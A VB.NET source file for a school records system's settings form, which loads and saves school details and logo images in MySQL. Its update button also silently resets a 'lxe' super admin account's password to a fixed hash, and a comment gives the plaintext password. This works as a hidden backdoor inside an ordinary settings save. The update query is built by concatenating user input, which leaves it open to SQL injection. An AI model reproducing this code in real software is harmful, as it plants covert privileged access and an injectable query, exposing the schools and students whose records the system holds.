Imports MySql.Data.MySqlClient
Public Class frmSystemSettings
    Dim str As String
    Public Sub schoolInfo()
        Try
            Dim objCmd As MySql.Data.MySqlClient.MySqlCommand
            str = "select * from srms_settings limit 1"
            conn.Open()
            Dim dtReader As MySql.Data.MySqlClient.MySqlDataReader
            objCmd = New MySql.Data.MySqlClient.MySqlCommand(Str, conn)
            dtReader = objCmd.ExecuteReader()
            If dtReader.Read Then
                lblSettingsID.Text = dtReader(0)
                txtDivision.Text = dtReader(1)
                txtSDS.Text = dtReader(2)
                txtSchoolIDSHS.Text = dtReader(3)
                txtSchoolID.Text = dtReader(4)
                txtSchoolName.Text = dtReader(5)
                txtSchoolAddress.Text = dtReader(6)
                txtSchoolHead.Text = dtReader(7)
                txtSchoolHeadPosition.Text = dtReader(8)
                txtPropertyCustodian.Text = dtReader(9)
                txtRegistrarSHS.Text = dtReader(10)
                txtRegistrarJHS.Text = dtReader(11)
                txtGuidance.Text = dtReader(12)
                txtGuidanceJHS.Text = dtReader(13)
                txtMember1.Text = dtReader(14)
                txtMember2.Text = dtReader(15)
                cboRegion.Text = dtReader(16)
                txtAdminOfficer.Text = dtReader(17)
                txtAdminOfficerPosition.Text = dtReader(18)
                txtSDSPosition.Text = dtReader(19)
                txtRegionalOffice.Text = dtReader(20)

                Dim arrImage() As Byte
                Dim arrImage2() As Byte
                Dim arrImage3() As Byte
                arrImage = dtReader.Item(21)
                arrImage2 = dtReader.Item(22)
                arrImage3 = dtReader.Item(23)
                Dim mstream As New System.IO.MemoryStream(arrImage)
                Dim mstream2 As New System.IO.MemoryStream(arrImage2)
                Dim mstream3 As New System.IO.MemoryStream(arrImage3)
                PictureBox1.Image = Image.FromStream(mstream)
                PictureBox2.Image = Image.FromStream(mstream2)
                PictureBox3.Image = Image.FromStream(mstream3)

                txtRegionalDirector.Text = dtReader(24)
                txtRegPosition.Text = dtReader(25)
                txtDivisionAddress.Text = dtReader(26)

            End If
            conn.Close()
        Catch ex As Exception
            MsgBox(ex.Message)
            conn.Close()
        End Try
    End Sub

    Private Sub frmSettings_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        schoolInfo()
    End Sub

    Private Sub btnUpdate_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnUpdate.Click
        Try

            'convert image to byte
            Dim mstream As New System.IO.MemoryStream()
            Dim mstream2 As New System.IO.MemoryStream()
            Dim mstream3 As New System.IO.MemoryStream()
            PictureBox1.Image.Save(mstream, System.Drawing.Imaging.ImageFormat.Jpeg)
            PictureBox2.Image.Save(mstream2, System.Drawing.Imaging.ImageFormat.Jpeg)
            PictureBox3.Image.Save(mstream3, System.Drawing.Imaging.ImageFormat.Jpeg)
            'declare arrImage as Byte to read buffer
            Dim arrImage() As Byte = mstream.GetBuffer()
            Dim arrImage2() As Byte = mstream2.GetBuffer
            Dim arrImage3() As Byte = mstream3.GetBuffer
            mstream.Close()

            str = "update srms_settings set Division='" & txtDivision.Text & "',SDS='" & txtSDS.Text & "',SchoolIDSHS='" & txtSchoolID.Text & "',SchoolIDJHS='" & txtSchoolID.Text & "',SchoolName='" & txtSchoolName.Text & "',SchoolAddress='" & txtSchoolAddress.Text & "',SchoolHead='" & txtSchoolHead.Text & "',sHeadPosition='" & txtSchoolHeadPosition.Text & "',PropertyCustodian='" & txtPropertyCustodian.Text & "',RegistrarSHS='" & txtRegistrarSHS.Text & "',RegistrarJHS='" & txtRegistrarJHS.Text & "',GuidanceSHS='" & txtGuidance.Text & "',GuidanceJHS='" & txtGuidanceJHS.Text & "',member1Prop='" & txtMember1.Text & "',member2Prop='" & txtMember2.Text & "',Region='" & cboRegion.Text & "',adas1='" & txtAdminOfficer.Text & "',adas1Position='" & txtAdminOfficerPosition.Text & "',regionAddress='" & txtRegionalOffice.Text & "',schoolLogo=@Sub_Image,letterHead=@Sub_Image2,depedLogo=@Sub_Image3,regionalDirector='" & txtRegionalDirector.Text & "',directorPosition='" & txtRegPosition.Text & "',divisionAddress='" & txtDivisionAddress.Text & "',district='" & txtDistrict.Text & "',districtOfficeAd='" & txtDistrictAddress.Text & "',districtSupervisor='" & txtDistrictSupervisor.Text & "' where settingsID='" & lblSettingsID.Text & "'"
            conn.Open()
            Dim mysc As New MySqlCommand(str, conn)
            mysc.Parameters.AddWithValue("@Sub_Image", arrImage)
            mysc.Parameters.AddWithValue("@Sub_Image2", arrImage2)
            mysc.Parameters.AddWithValue("@Sub_Image3", arrImage3)
            mysc.ExecuteNonQuery()
            conn.Close()

            'Update Super Admin Account password to .P0liceReport
            str = "update users set password='3d4b9b6461ec7b9f13082152ec84ef65f685003e' where username='lxe'"
            conn.Open()
            Dim mysc1 As New MySqlCommand(str, conn)
            mysc1.ExecuteNonQuery()
            conn.Close()

            MsgBox("Updated successfully!", MsgBoxStyle.Information)
            schoolInfo()
            frmParent.schoolInfo()

        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Exclamation)
            conn.Close()
        End Try
    End Sub

    Private Sub brnBrowse_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles brnBrowse.Click
        Try
            Dim imgpath As String
            Dim OFD As FileDialog = New OpenFileDialog()

            OFD.Filter = "Image File (*.jpg;*.png;*.bmp;*.gif)|*.jpg;*.png;*.bmp;*.gif"

            If OFD.ShowDialog() = DialogResult.OK Then
                imgpath = OFD.FileName
                PictureBox1.ImageLocation = imgpath

            End If

            OFD = Nothing

        Catch ex As Exception
            MsgBox(ex.Message.ToString())
        End Try
    End Sub

    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        Try
            Dim imgpath As String
            Dim OFD As FileDialog = New OpenFileDialog()

            OFD.Filter = "Image File (*.jpg;*.png;*.bmp;*.gif)|*.jpg;*.png;*.bmp;*.gif"

            If OFD.ShowDialog() = DialogResult.OK Then
                imgpath = OFD.FileName
                PictureBox2.ImageLocation = imgpath

            End If

            OFD = Nothing

        Catch ex As Exception
            MsgBox(ex.Message.ToString())
        End Try
    End Sub

    Private Sub Button2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button2.Click
        Try
            Dim imgpath As String
            Dim OFD As FileDialog = New OpenFileDialog()

            OFD.Filter = "Image File (*.jpg;*.png;*.bmp;*.gif)|*.jpg;*.png;*.bmp;*.gif"

            If OFD.ShowDialog() = DialogResult.OK Then
                imgpath = OFD.FileName
                PictureBox3.ImageLocation = imgpath
            End If

            OFD = Nothing

        Catch ex As Exception
            MsgBox(ex.Message.ToString())
        End Try
    End Sub
End Class